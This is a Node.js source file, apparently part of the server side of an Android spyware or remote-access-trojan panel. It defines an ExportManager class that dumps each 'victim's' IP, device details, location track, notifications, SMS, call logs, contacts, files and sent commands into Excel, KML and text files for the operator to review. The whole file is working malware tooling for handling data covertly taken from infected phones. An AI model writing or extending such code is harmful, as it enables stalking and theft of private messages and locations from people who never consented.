const XLSX = require('xlsx');
const fs = require('fs');
const path = require('path');

class ExportManager {
    constructor(database) {
        this.db = database;
    }

    /**
     * Export toàn bộ dữ liệu của một victim ra file Excel
     */
    exportVictimToExcel(victimId, outputDir = null) {
        if (!outputDir) {
            outputDir = path.join(__dirname, 'exports');
        }

        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
        }

        const victim = this.db.getVictim(victimId);
        if (!victim) {
            throw new Error(`Victim ${victimId} not found`);
        }

        // Tạo workbook
        const wb = XLSX.utils.book_new();

        // Sheet 1: Thông tin victim
        const victimInfo = [
            ['Victim ID', victimId],
            ['IP Address', victim.ip],
            ['Country', victim.country],
            ['Manufacturer', victim.manufacturer],
            ['Model', victim.model],
            ['Android Version', victim.android_version],
            ['First Seen', victim.first_seen],
            ['Last Seen', victim.last_seen],
            ['Total Connections', victim.total_connections],
            ['Status', victim.is_online ? 'Online' : 'Offline']
        ];
        const wsVictim = XLSX.utils.aoa_to_sheet(victimInfo);
        XLSX.utils.book_append_sheet(wb, wsVictim, 'Victim Info');

        // Sheet 2: Locations
        const locations = this.db.getLocationHistory(victimId, 10000);
        if (locations.length > 0) {
            const wsLocations = XLSX.utils.json_to_sheet(locations);
            XLSX.utils.book_append_sheet(wb, wsLocations, 'Locations');
        }

        // Sheet 3: Notifications
        const notifications = this.db.getNotifications(victimId, 10000);
        if (notifications.length > 0) {
            const wsNotifications = XLSX.utils.json_to_sheet(notifications);
            XLSX.utils.book_append_sheet(wb, wsNotifications, 'Notifications');
        }

        // Sheet 4: SMS
        const sms = this.db.getSMSHistory(victimId, 10000);
        if (sms.length > 0) {
            const wsSMS = XLSX.utils.json_to_sheet(sms);
            XLSX.utils.book_append_sheet(wb, wsSMS, 'SMS');
        }

        // Sheet 5: Call Logs
        const callLogs = this.db.getCallLogs(victimId, 10000);
        if (callLogs.length > 0) {
            const wsCallLogs = XLSX.utils.json_to_sheet(callLogs);
            XLSX.utils.book_append_sheet(wb, wsCallLogs, 'Call Logs');
        }

        // Sheet 6: Contacts
        const contacts = this.db.getContacts(victimId);
        if (contacts.length > 0) {
            const wsContacts = XLSX.utils.json_to_sheet(contacts);
            XLSX.utils.book_append_sheet(wb, wsContacts, 'Contacts');
        }

        // Sheet 7: Files
        const files = this.db.getFiles(victimId, 10000);
        if (files.length > 0) {
            const wsFiles = XLSX.utils.json_to_sheet(files);
            XLSX.utils.book_append_sheet(wb, wsFiles, 'Files');
        }

        // Sheet 8: Commands
        const commands = this.db.getCommands(victimId, 10000);
        if (commands.length > 0) {
            const wsCommands = XLSX.utils.json_to_sheet(commands);
            XLSX.utils.book_append_sheet(wb, wsCommands, 'Commands');
        }

        // Lưu file
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const filename = `${victimId}_${timestamp}.xlsx`;
        const filepath = path.join(outputDir, filename);

        XLSX.writeFile(wb, filepath);
        console.log(`✅ Exported victim data to: ${filepath}`);

        return filepath;
    }

    /**
     * Export tất cả victims ra một file Excel tổng hợp
     */
    exportAllVictims(outputDir = null) {
        if (!outputDir) {
            outputDir = path.join(__dirname, 'exports');
        }

        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
        }

        const victims = this.db.getAllVictims();

        if (victims.length === 0) {
            throw new Error('No victims found in database');
        }

        const wb = XLSX.utils.book_new();
        const ws = XLSX.utils.json_to_sheet(victims);
        XLSX.utils.book_append_sheet(wb, ws, 'All Victims');

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const filename = `all_victims_${timestamp}.xlsx`;
        const filepath = path.join(outputDir, filename);

        XLSX.writeFile(wb, filepath);
        console.log(`✅ Exported all victims to: ${filepath}`);

        return filepath;
    }

    /**
     * Export lịch sử vị trí ra file KML (để mở trong Google Maps)
     */
    exportLocationsToKML(victimId, outputDir = null) {
        if (!outputDir) {
            outputDir = path.join(__dirname, 'exports');
        }

        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
        }

        const locations = this.db.getLocationHistory(victimId, 10000);

        if (locations.length === 0) {
            throw new Error('No location data found');
        }

        let kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>Location History - ${victimId}</name>
    <description>Tracked locations</description>
    <Style id="trackStyle">
      <LineStyle>
        <color>ff0000ff</color>
        <width>4</width>
      </LineStyle>
    </Style>
`;

        // Thêm các điểm
        locations.forEach((loc, index) => {
            kml += `
    <Placemark>
      <name>Point ${index + 1}</name>
      <description>Time: ${loc.timestamp}</description>
      <Point>
        <coordinates>${loc.longitude},${loc.latitude},0</coordinates>
      </Point>
    </Placemark>`;
        });

        // Thêm đường đi
        kml += `
    <Placemark>
      <name>Path</name>
      <styleUrl>#trackStyle</styleUrl>
      <LineString>
        <coordinates>
`;

        locations.reverse().forEach(loc => {
            kml += `          ${loc.longitude},${loc.latitude},0\n`;
        });

        kml += `        </coordinates>
      </LineString>
    </Placemark>
  </Document>
</kml>`;

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const filename = `${victimId}_locations_${timestamp}.kml`;
        const filepath = path.join(outputDir, filename);

        fs.writeFileSync(filepath, kml);
        console.log(`✅ Exported locations to KML: ${filepath}`);

        return filepath;
    }

    /**
     * Export tin nhắn ra file text dễ đọc
     */
    exportMessagesToText(victimId, outputDir = null) {
        if (!outputDir) {
            outputDir = path.join(__dirname, 'exports');
        }

        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
        }

        const notifications = this.db.getNotifications(victimId, 10000);

        if (notifications.length === 0) {
            throw new Error('No notifications found');
        }

        let text = `=================================================\n`;
        text += `MESSAGE HISTORY - ${victimId}\n`;
        text += `Exported: ${new Date().toLocaleString()}\n`;
        text += `Total Messages: ${notifications.length}\n`;
        text += `=================================================\n\n`;

        notifications.forEach((notif, index) => {
            text += `[${index + 1}] ${notif.timestamp}\n`;
            text += `App: ${notif.app_name || notif.package_name}\n`;
            text += `Title: ${notif.title}\n`;
            text += `Content: ${notif.content}\n`;
            text += `-------------------------------------------------\n\n`;
        });

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const filename = `${victimId}_messages_${timestamp}.txt`;
        const filepath = path.join(outputDir, filename);

        fs.writeFileSync(filepath, text, 'utf8');
        console.log(`✅ Exported messages to text: ${filepath}`);

        return filepath;
    }
}

module.exports = ExportManager;
